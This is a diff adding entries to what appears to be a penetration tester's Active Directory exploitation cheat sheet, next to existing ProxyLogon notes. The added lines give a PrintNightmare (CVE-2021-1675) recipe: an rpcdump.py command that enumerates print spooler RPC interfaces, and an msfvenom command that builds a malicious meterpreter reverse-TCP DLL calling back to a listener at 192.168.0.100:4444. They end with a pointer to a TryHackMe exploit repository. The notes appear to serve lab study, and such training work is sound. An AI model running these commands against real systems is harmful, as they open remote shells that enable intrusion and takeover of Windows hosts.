@@ -97,3 +97,12 @@ https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=rea
 - affects: (Exchange 2013 Versions , Exchange 2016 CU18 , Exchange 2016 CU19, Exchange 2019)
 - https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxylogon_rce/
 ----
+enum:
+```shell-session
+rpcdump.py @MACHINE_IP | egrep 'MS-RPRN|MS-PAR' 
+```
+exploit
+```shell-session
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o malicious.dll 
+```
+then follow [cve-2021-1675](https://github.com/tryhackme/CVE-2021-1675.git) 
